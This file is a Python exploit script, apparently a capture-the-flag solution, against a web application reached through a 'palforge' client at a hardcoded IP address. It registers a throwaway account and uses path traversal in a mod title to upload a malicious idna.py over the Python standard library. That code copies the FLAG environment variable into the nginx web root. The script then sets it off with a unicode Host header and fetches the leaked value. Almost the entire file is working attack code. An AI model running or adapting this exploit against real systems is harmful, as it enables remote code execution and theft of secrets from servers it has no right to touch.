import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36534"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

# plant encodings/idna.py marker in /usr/local stdlib
tok,u=fresh()
mal=b'import os\nopen("/usr/share/nginx/html/zz_idna","w").write(os.environ.get("FLAG","NOFLAG"))\n'
# storage_dir=/usr/local/lib/python3.11/encodings, filename=idna.py
pid=pf.create_platform(tok,"encodings",name="z"); mid=pf.create_mod(tok,"../../../usr/local/lib/python3.11",title="z")
try:
    bid=pf.create_build(tok,mid,pid)
    r=pf.upload_zip(tok,mid,bid,{"idna.py":mal})
    print("plant encodings/idna ->",r.status_code, r.text[:60])
except Exception as e:
    print("plant err", repr(e)[:80])
# trigger: request with unicode Host header (triggers idna codec for hostname normalization)
try:
    rr=requests.get(f"{BASE}/", headers={"Host":"\u00e9xample.com"}, timeout=10)
    print("unicode host ->", rr.status_code)
except Exception as e:
    print("unicode host err", repr(e)[:80])
# also register with unicode username (triggers unicodedata/idna?)
try:
    uu="\u00e9"+str(random.randint(1000,9999))
    requests.post(f"{BASE}/api/auth/register/", json={"username":uu,"password":"pass12345","full_name":"x"}, timeout=10)
except Exception as e:
    print("unicode reg err", repr(e)[:60])
time.sleep(1)
c=requests.get(f"{BASE}/zz_idna",timeout=6)
print("idna marker:",c.status_code,repr(c.content[:50]))
